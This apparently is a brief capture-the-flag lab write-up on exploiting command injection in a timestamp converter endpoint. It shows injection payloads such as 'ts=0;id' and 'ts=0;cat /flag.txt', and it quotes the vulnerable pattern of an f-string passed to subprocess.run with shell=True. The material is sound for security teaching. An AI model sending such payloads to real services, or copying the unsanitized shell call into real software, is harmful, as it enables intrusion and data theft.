# Finding the Bug

## Enumerate the service

```
GET /
```

Response:

```
Epoch Timestamp Converter
Usage: GET /convert?ts=<unix_timestamp>
Example: GET /convert?ts=0
```

## Test normal input

```
GET /convert?ts=0
```

Response:

```
Thu Jan  1 00:00:00 UTC 1970
```

The endpoint converts a timestamp to a date string.

## Probe for injection

Try a semicolon followed by a command:

```
GET /convert?ts=0;id
```

If the application sanitizes input, this returns an error or the same date output. If it does not, it returns date output plus the result of `id`.

## Read the source

Look at `lab/app.py`. The vulnerable call:

```python
cmd = f"date -d @{ts}"
subprocess.run(cmd, shell=True)
```

No sanitization. The user-supplied value goes directly into the shell string.

## Inject to read the flag

```
GET /convert?ts=0;cat /flag.txt
```

The shell runs `date -d @0` then `cat /flag.txt`. The flag appears in the response.
